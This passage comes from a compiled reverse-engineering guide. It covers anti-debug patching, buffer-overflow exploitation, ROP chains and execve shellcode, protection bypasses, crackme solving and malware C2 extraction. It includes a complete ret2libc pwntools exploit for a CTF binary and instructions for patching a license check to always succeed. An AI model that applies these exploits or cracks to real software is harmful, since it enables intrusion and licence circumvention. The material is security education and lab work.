Autosearch \u2192 Get Imports \u2192 Fix Dump"}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"anti-debugging-techniques",children:"Anti-Debugging Techniques"}),"\n",(0,i.jsxs)(n.p,{children:["See ",(0,i.jsx)(n.a,{href:"#bypassing-anti-debugging",children:"Dynamic Analysis \u2192 Bypassing Anti-Debugging"})," for detailed techniques and bypasses."]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Common anti-debugging methods:"})}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"IsDebuggerPresent"})," API call"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"PEB BeingDebugged"})," flag check"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"RDTSC"})," timing checks"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Exception-based detection"})," (debuggers handle exceptions differently)"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Hardware breakpoint detection"})," (check DR0-DR7 registers)"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Software breakpoint detection"})," (check for ",(0,i.jsx)(n.code,{children:"0xCC"})," INT3 instructions)"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Parent process check"})," (debugged process has debugger as parent)"]}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Patching anti-debugging:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# IDA Pro: Identify anti-debug check, patch to NOP\n# Example: Patch "call IsDebuggerPresent" to "xor eax, eax"\n\n# Before:\ncall IsDebuggerPresent  ; E8 XX XX XX XX\ntest eax, eax           ; 85 C0\njnz debugger_detected   ; 75 XX\n\n# After (patch):\nxor eax, eax            ; 33 C0\nnop                     ; 90\nnop                     ; 90\nnop                     ; 90\ntest eax, eax           ; 85 C0 (unchanged, EAX always 0)\njnz debugger_detected   ; 75 XX (never jumps)\n\n# IDA Pro: Edit \u2192 Patch program \u2192 Assemble\n# Or: Hex edit: Replace "E8 XX XX XX XX" with "33 C0 90 90 90"\n'})}),"\n",(0,i.jsx)(n.h3,{id:"code-virtualization",children:"Code Virtualization"}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.strong,{children:"Code virtualization"})," converts native code to custom VM bytecode."]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Example (VMProtect):"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Before (native x86):"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-nasm",children:"mov eax, 0x42\nadd eax, ebx\nret\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"After (VMProtect - custom bytecode):"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"VM_PUSH 0x42        ; Push 0x42 to VM stack\nVM_PUSH_REG EBX     ; Push EBX to VM stack\nVM_ADD              ; Pop two values, add, push result\nVM_POP_REG EAX      ; Pop result to EAX\nVM_RET              ; Return\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Defeating virtualization:"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Time-consuming:"})," Reverse the VM interpreter (understand bytecode handlers)"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Automated tools:"})," VMAttack, NoVmp (experimental, limited success)"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Alternative:"})," Dynamic analysis (bypass VM, focus on decrypted API calls)"]}),"\n"]}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h2,{id:"exploit-development",children:"Exploit Development"}),"\n",(0,i.jsx)(n.h3,{id:"buffer-overflows",children:"Buffer Overflows"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Stack-based buffer overflow:"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Vulnerable code:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-c",children:'#include <stdio.h>\n#include <string.h>\n\nvoid vulnerable_function(char *input) {\n    char buffer[64];\n    strcpy(buffer, input);  // No bounds checking!\n    printf("Buffer: %s\\n", buffer);\n}\n\nint main(int argc, char **argv) {\n    if (argc > 1) {\n        vulnerable_function(argv[1]);\n    }\n    return 0;\n}\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Exploitation:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-python",children:'# Generate payload to overwrite return address\nimport struct\n\n# Step 1: Find offset to return address\n# Use pattern_create (pwntools or msf-pattern_create)\n# python3 -c \'from pwn import *; print(cyclic(200))\'\n\n# Step 2: Run program with pattern, crash at EIP=0x61616171\n# Use pattern_offset to find offset:\n# python3 -c \'from pwn import *; print(cyclic_find(0x61616171))\'\n# Offset: 76 bytes\n\n# Step 3: Craft payload\noffset = 76\nreturn_address = struct.pack("<I", 0x08048484)  # Address of shellcode or gadget\nnop_sled = b"\\x90" * 16  # NOP sled\nshellcode = b"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68..."  # Shellcode (spawn shell)\n\npayload = b"A" * offset + return_address + nop_sled + shellcode\n\n# Run:\n# ./vulnerable "$(python3 exploit.py)"\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Stack layout during overflow:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"High memory\n-----------------\n[Return address]   <-- Overwrite with shellcode address\n[Saved EBP]        <-- Overwritten\n[buffer[64]]       <-- Buffer overflow starts here\n...\nLow memory\n"})}),"\n",(0,i.jsx)(n.h3,{id:"return-oriented-programming-rop",children:"Return-Oriented Programming (ROP)"}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.strong,{children:"ROP"}),' chains together "gadgets" (short instruction sequences ending in ',(0,i.jsx)(n.code,{children:"ret"}),") to execute code without injecting shellcode."]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Why ROP?"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"DEP/NX:"})," Data Execution Prevention prevents executing code on stack/heap"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"ASLR:"})," Address Space Layout Randomization makes hardcoded addresses unreliable"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"ROP bypasses DEP:"})," Uses existing code in binary/libraries (already executable)"]}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Finding ROP gadgets:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# ROPgadget (Python tool):\nROPgadget --binary vulnerable --ropchain\n\n# Or use ropper:\nropper --file vulnerable --search "pop rdi"\n\n# Example gadgets:\n0x004005a3: pop rdi; ret\n0x004005a1: pop rsi; pop r15; ret\n0x00400490: pop rax; ret\n0x00400610: syscall; ret\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:'ROP chain example (call execve("/bin/sh")):'})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-python",children:'from pwn import *\n\n# Gadgets:\npop_rdi = 0x004005a3  # pop rdi; ret\npop_rsi_r15 = 0x004005a1  # pop rsi; pop r15; ret\npop_rax = 0x00400490  # pop rax; ret\nsyscall = 0x00400610  # syscall; ret\n\n# Data:\nbin_sh = 0x00601050  # Address of "/bin/sh" string in binary\n\n# ROP chain to call execve("/bin/sh", NULL, NULL):\n# execve(rdi="/bin/sh", rsi=NULL, rdx=NULL) -> syscall 59\n\nrop_chain = p64(pop_rdi) + p64(bin_sh)       # rdi = "/bin/sh"\nrop_chain += p64(pop_rsi_r15) + p64(0) + p64(0)  # rsi = NULL, r15 = 0\nrop_chain += p64(pop_rax) + p64(59)          # rax = 59 (execve syscall)\nrop_chain += p64(syscall)                    # syscall\n\n# Full payload:\npayload = b"A" * 76 + rop_chain\n\n# Send to vulnerable program\n'})}),"\n",(0,i.jsx)(n.h3,{id:"shellcode-development",children:"Shellcode Development"}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.strong,{children:"Shellcode"})," is position-independent code (typically for spawning a shell)."]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:'Linux x64 shellcode (execve("/bin/sh")):'})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-nasm",children:'; execve("/bin/sh", NULL, NULL)\n; syscall number: 59 (in RAX)\n\nsection .text\nglobal _start\n\n_start:\n    xor rax, rax        ; RAX = 0\n    push rax            ; NULL terminator\n    mov rdi, 0x68732f6e69622f  ; "/bin/sh" (little-endian)\n    push rdi            ; Push "/bin/sh" onto stack\n    mov rdi, rsp        ; RDI = pointer to "/bin/sh"\n    xor rsi, rsi        ; RSI = NULL (argv)\n    xor rdx, rdx        ; RDX = NULL (envp)\n    mov al, 59          ; RAX = 59 (execve syscall)\n    syscall             ; Execute syscall\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Assemble shellcode:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Assemble:\nnasm -f elf64 shellcode.asm -o shellcode.o\nld shellcode.o -o shellcode\n\n# Extract bytes:\nobjdump -d shellcode -M intel | grep '^ ' | cut -f2 | tr -d ' \\n'\n# Output: 4831c05048bf2f62696e2f736800574889e74831f64831d2b03b0f05\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Python shellcode payload:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-python",children:'shellcode = b"\\x48\\x31\\xc0\\x50\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00"\nshellcode += b"\\x57\\x48\\x89\\xe7\\x48\\x31\\xf6\\x48\\x31\\xd2\\xb0\\x3b\\x0f\\x05"\n\n# Use in exploit:\npayload = nop_sled + shellcode + return_address\n'})}),"\n",(0,i.jsx)(n.h3,{id:"bypassing-protections",children:"Bypassing Protections"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"DEP/NX (Data Execution Prevention):"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"What it does:"})," Marks stack/heap as non-executable"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Bypass:"})," ROP (return-oriented programming)"]}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"ASLR (Address Space Layout Randomization):"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"What it does:"})," Randomizes base addresses of stack, heap, libraries"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Bypass:"})," Information leak (leak address, calculate offsets)"]}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Stack Canaries:"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"What it does:"})," Places random value before return address, checks on function return"]}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.strong,{children:"Detection:"})}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-nasm",children:"mov rax, qword ptr fs:[0x28]  ; Load canary from TLS\nmov qword ptr [rbp-0x8], rax  ; Store canary on stack\n; ... function body ...\nmov rax, qword ptr [rbp-0x8]  ; Load canary from stack\nxor rax, qword ptr fs:[0x28]  ; Compare with original\njne __stack_chk_fail          ; Crash if mismatch\n"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Bypass:"})," Leak canary value (via format string or info leak)"]}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"PIE (Position Independent Executable):"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"What it does:"})," Binary can be loaded at any address (extends ASLR to code section)"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Bypass:"})," Information leak (leak code address, calculate gadget offsets)"]}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Checking protections:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Linux: checksec (pwntools):\nchecksec --file vulnerable\n# Output:\n# RELRO: Partial RELRO\n# Stack: No canary found\n# NX: NX enabled\n# PIE: No PIE\n\n# Windows: PESecurity (PowerShell):\nGet-PESecurity -file vulnerable.exe\n"})}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h2,{id:"practical-workflows",children:"Practical Workflows"}),"\n",(0,i.jsx)(n.h3,{id:"crackme-challenges",children:"Crackme Challenges"}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.strong,{children:"Scenario:"}),' Reverse a "crackme" challenge to find the correct password.']}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Workflow:"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"1. Initial triage:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'file crackme\n# Output: ELF 64-bit LSB executable\n\nstrings crackme | grep -i password\n# Output: "Enter password:", "Correct!", "Wrong!"\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"2. Disassemble in Ghidra:"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Load binary \u2192 Analyze"}),"\n",(0,i.jsxs)(n.li,{children:["Find ",(0,i.jsx)(n.code,{children:"main"}),' function (or search for "Enter password" string, find xrefs)']}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"3. Identify comparison:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-c",children:'// Decompiled code (Ghidra):\nint main(void) {\n    char input[32];\n    printf("Enter password: ");\n    scanf("%s", input);\n\n    if (strcmp(input, "secret_password") == 0) {\n        printf("Correct!\\n");\n        return 0;\n    } else {\n        printf("Wrong!\\n");\n        return 1;\n    }\n}\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"4. Extract password:"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["Password hardcoded: ",(0,i.jsx)(n.code,{children:'"secret_password"'})]}),"\n",(0,i.jsxs)(n.li,{children:["Alternative: Dynamic analysis (set breakpoint on ",(0,i.jsx)(n.code,{children:"strcmp"}),", inspect arguments)"]}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"5. Verify:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"./crackme\n# Enter password: secret_password\n# Output: Correct!\n"})}),"\n",(0,i.jsx)(n.h3,{id:"patching-binaries",children:"Patching Binaries"}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.strong,{children:"Scenario:"}),' Patch a license check to always return "valid."']}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Workflow:"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"1. Find license check in IDA/Ghidra:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-nasm",children:"; Original code:\ncall check_license  ; Returns 0 (invalid) or 1 (valid)\ntest eax, eax\njz license_invalid  ; Jump if zero (invalid)\n; ... license valid path ...\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"2. Patch comparison:"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:'Option A: Patch jump (always take "valid" path):'})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-nasm",children:"; Before:\njz license_invalid  ; 74 XX (conditional jump)\n\n; After:\njmp license_valid   ; EB XX (unconditional jump)\n; Or: NOP the jump entirely\nnop                 ; 90\nnop                 ; 90\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Option B: Patch function to always return 1:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-nasm",children:"; Patch check_license function:\n; Before:\ncheck_license:\n    ; ... complex license verification ...\n    ret\n\n; After:\ncheck_license:\n    mov eax, 1      ; Always return 1 (valid)\n    ret\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"3. Apply patch in IDA:"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Edit \u2192 Patch program \u2192 Assemble"})," (modify instructions)"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Edit \u2192 Patch program \u2192 Apply patches to input file"})," (save patched binary)"]}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"4. Verify:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"./patched_binary\n# License check bypassed!\n"})}),"\n",(0,i.jsx)(n.h3,{id:"malware-analysis-integration",children:"Malware Analysis Integration"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsxs)(n.strong,{children:["See ",(0,i.jsx)(n.a,{href:"../../Security/Analysis/sop-malware-analysis",children:"Malware Analysis"})," for comprehensive malware reversing workflows."]})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Quick integration:"})}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Static analysis"})," (Ghidra/IDA): Identify suspicious functions (network, encryption, persistence)"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Dynamic analysis"})," (x64dbg/GDB): Monitor API calls, network traffic, file modifications"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Extract IOCs"})," (IPs, domains, file hashes, registry keys)"]}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.strong,{children:"Behavioral analysis"})}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Example: Extract C2 server address:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Static: Search for IP/domain strings\nstrings malware.exe | grep -E "([0-9]{1,3}\\.){3}[0-9]{1,3}|https?://"\n\n# Dynamic: Monitor network calls in x64dbg\n# Set breakpoint on "connect", "WSAConnect", "InternetConnectA"\n# Inspect arguments when hit (IP, port in sockaddr structure)\n'})}),"\n",(0,i.jsx)(n.h3,{id:"ctf-binary-exploitation",children:"CTF Binary Exploitation"}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.strong,{children:"Scenario:"})," CTF pwn challenge with buffer overflow."]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Workflow:"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"1. Download binary and check protections:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"checksec chall\n# Output: NX enabled, No PIE, No canary\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsxs)(n.strong,{children:["2. Find vulnerability (buffer overflow in ",(0,i.jsx)(n.code,{children:"gets()"}),"):"]})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-c",children:"// Decompiled:\nvoid vuln() {\n    char buffer[64];\n    gets(buffer);  // Vulnerable!\n    puts(buffer);\n}\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"3. Find offset to return address:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Generate cyclic pattern:\npython3 -c 'from pwn import *; print(cyclic(200))' > pattern.txt\n\n# Run in GDB:\ngdb ./chall\nrun < pattern.txt\n# Crash at RIP = 0x6161616b (\"kaaa\")\n\n# Find offset:\npython3 -c 'from pwn import *; print(cyclic_find(0x6161616b))'\n# Offset: 72\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"4. Develop exploit (ret2libc to bypass NX):"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-python",children:'from pwn import *\n\n# Addresses:\nputs_plt = 0x400530      # puts@PLT\nputs_got = 0x601018      # puts@GOT\npop_rdi = 0x4006d3       # pop rdi; ret gadget\nret = 0x4006d4           # ret gadget (for alignment)\nmain = 0x400626          # main function\n\n# Stage 1: Leak libc address\npayload = b"A" * 72\npayload += p64(pop_rdi) + p64(puts_got)  # rdi = puts@GOT\npayload += p64(puts_plt)                 # Call puts(puts@GOT) -> leak libc\npayload += p64(main)                     # Return to main\n\np = process(\'./chall\')\np.sendline(payload)\nleak = u64(p.recvline().strip().ljust(8, b\'\\x00\'))\nlibc_base = leak - 0x809c0  # Offset to puts in libc\nsystem = libc_base + 0x4f440\nbin_sh = libc_base + 0x1b3e9a\n\n# Stage 2: Call system("/bin/sh")\npayload2 = b"A" * 72\npayload2 += p64(ret)  # Stack alignment\npayload2 += p64(pop_rdi) + p64(bin_sh)\npayload2 += p64(system)\n\np.sendline(payload2)\np.interactive()  # Shell!\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"5. Submit flag:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# In shell:\ncat flag.txt\n"})}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h2,{id:"tools-reference",children:"Tools Reference"}),"\n",(0,i.jsx)(n.h3,{id:"disassemblers--decompilers-1",children:"Disassemblers & Decompilers"}),"\n",(0,i.jsxs)(n.table,{children:[(0,i.jsx)(n.thead,{children:(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.th,{children:"Tool"}),(0,i.jsx)(n.th,{children:"Type"}),(0,i.jsx)(n.th,{children:"Platform"}),(0,i.jsx)(n.th,{children:"Cost"}),(0,i.jsx)(n.th,{children:"Download"})]})}),(0,i.jsxs)(n.tbody,{children:[(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"IDA Pro"})}),(0,i.jsx)(n.td,{children:"Disassembler + Decompiler"}),(0,i.jsx)(n.td,{children:"Win/Linux/macOS"}),(0,i.jsx)(n.td,{children:"$$$"}),(0,i.jsx)(n.td,{children:(0,i.jsx)(n.a,{href:"https://hex-rays.com/ida-pro/",children:"https://hex-rays.com/ida-pro/"})})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Ghidra"})}),(0,i.jsx)(n.td,{children:"Disassembler + Decompiler"}),(0,i.jsx)(n.td,{children:"Win/Linux/macOS"}),(0,i.jsx)(n.td,{children:"Free"}),(0,i.jsx)(n.td,{children:(0,i.jsx)(n.a,{href:"https://ghidra-sre.org/",children:"https://ghidra-sre.org/"})})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Binary Ninja"})}),(0,i.jsx)(n.td,{children:"Disassembler + Decompiler"}),(0,i.jsx)(n.td,{children:"Win/Linux/macOS"}),(0,i.jsx)(n.td,{children:"$$"}),(0,i.jsx)(n.td,{children:(0,i.jsx)(n.a,{href:"https://binary.ninja/",children:"https://binary.ninja/"})})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Radare2"})}),(0,i.jsx)(n.td,{children:"Disassembler"}),(0,i.jsx)(n.td,{children:"Win/Linux/macOS"}),(0,i.jsx)(n.td,{children:"Free"}),(0,i.jsx)(n.td,{children:(0,i.jsx)(n.a,{href:"https://rada.re/",children:"https://rada.re/"})})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Cutter"})}),(0,i.jsx)(n.td,{children:"Disassembler (r2 GUI)"}),(0,i.jsx)(n.td,{children:"Win/Linux/macOS"}),(0,i.jsx)(n.td,{children:"Free"}),(0,i.jsx)(n.td,{children:(0,i.jsx)(n.a,{href:"https://cutter.re/",children:"https://cutter.re/"})})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Hopper"})}),(0,i.jsx)(n.td,{children:"Disassembler + Decompiler"}),(0,i.jsx)(n.td,{children:"macOS/Linux"}),(0,i.jsx)(n.td,{children:"$"}),(0,i.jsx)(n.td,{children:(0,i.jsx)(n.a,{href:"https://www.hopperapp.com/",children:"https://www.hopperapp.com/"})})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"RetDec"})}),(0,i.jsx)(n.td,{children:"Decompiler (online/CLI)"}),(0,i.jsx)(n.td,{children:"Web/Linux"}),(0,i.jsx)(n.td,{children:"Free"}),(0,i.jsx)(n.td,{children:(0,i.jsx)(n.a,{href:"https://retdec.com/",children:"https://retdec.com/"})})]})]})]}),"\n",(0,i.jsx)(n.h3,{id:"debuggers-1",children:"Debuggers"}),"\n",(0,i.jsxs)(n.table,{children:[(0,i.jsx)(n.thead,{children:(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.th,{children:"Tool"}),(0,i.jsx)(n.th,{children:"Platform"}),(0,i.jsx)(n.th,{children:"Best For"})]})}),(0,i.jsxs)(n.tbody,{children:[(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"x64dbg"})}),(0,i.jsx)(n.td,{children:"Windows"}),(0,i.jsx)(n.td,{children:"Windows user-mode, malware, CTF"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"WinDbg"})}),(0,i.jsx)(n.td,{children:"Windows"}),(0,i.jsx)(n.td,{children:"Kernel debugging, crash analysis"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"GDB"})}),(0,i.jsx)(n.td,{children:"Linux/macOS"}),(0,i.jsx)(n.td,{children:"Linux/macOS debugging, exploits, Python scripting (PEDA/GEF/pwndbg)"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"LLDB"})}),(0,i.jsx)(n.td,{children:"macOS/Linux"}),(0,i.jsx)(n.td,{children:"macOS/iOS, modern alternative to GDB"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"OllyDbg"})}),(0,i.jsx)(n.td,{children:"Windows"}),(0,i.jsx)(n.td,{children:"Legacy 32-bit (x64dbg recommended)"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"IDA Debugger"})}),(0,i.jsx)(n.td,{children:"Win/Linux/macOS"}),(0,i.jsx)(n.td,{children:"Integrated with IDA disassembly"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"EDB"})}),(0,i.jsx)(n.td,{children:"Linux"}),(0,i.jsx)(n.td,{children:"Linux GUI debugger"})]})]})]}),"\n",(0,i.jsx)(n.h3,{id:"dynamic-instrumentation",children:"Dynamic Instrumentation"}),"\n",(0,i.jsxs)(n.table,{children:[(0,i.jsx)(n.thead,{children:(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.th,{children:"Tool"}),(0,i.jsx)(n.th,{children:"Platform"}),(0,i.jsx)(n.th,{children:"Purpose"})]})}),(0,i.jsxs)(n.tbody,{children:[(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Frida"})}),(0,i.jsx)(n.td,{children:"Win/Linux/macOS/Android/iOS"}),(0,i.jsx)(n.td,{children:"Runtime hooking, API monitoring"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"DynamoRIO"})}),(0,i.jsx)(n.td,{children:"Win/Linux"}),(0,i.jsx)(n.td,{children:"Dynamic binary instrumentation 